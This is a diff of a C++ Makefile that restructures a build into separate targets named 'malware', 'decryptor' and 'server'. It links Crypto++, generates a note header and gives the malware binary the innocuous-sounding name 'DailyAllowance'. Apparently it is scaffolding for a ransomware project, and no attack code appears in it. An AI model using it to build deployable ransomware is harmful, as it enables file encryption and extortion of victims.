@@ -1,14 +1,37 @@
 CXX=g++
 CXXFLAGS=-std=c++11 -flto -Os -Wall -lcryptopp
-SRC=$(wildcard src/*.cc)
-BIN=main
+
+MALWARE_SRC=$(wildcard src/malware/*.cc)
+DECRYPTOR_SRC=$(wildcard src/decryptor/*.cc)
+SERVER_SRC=$(wildcard src/server/*.cc)
+
+BUILD=build
+MALWARE=$(BUILD)/DailyAllowance
+DECRYPTOR=$(BUILD)/decryptor
+SERVER=$(BUILD)/server
+
 
 all:
+	make malware
+	make decryptor
+	make server
+
+malware:
+	mkdir -p $(BUILD)
 	./scripts/generate_note_h.py
-	$(CXX) -o $(BIN) $(SRC) $(CXXFLAGS)
+	$(CXX) -o $(MALWARE) $(MALWARE_SRC) $(CXXFLAGS)
+
+decryptor:
+	mkdir -p $(BUILD)
+	$(CXX) -o $(DECRYPTOR) $(DECRYPTOR_SRC) $(CXXFLAGS)
+
+server:
+	mkdir -p $(BUILD)
+	$(CXX) -o $(SERVER) $(SERVER_SRC) $(CXXFLAGS)
+
 
 %.clean:
-	rm $(BIN)
-
-run:
-	./$(BIN)
+	rm -rf $(BUILD)
+	rm $(MALWARE)
+	rm $(DECRYPTOR)
+	rm $(SERVER)
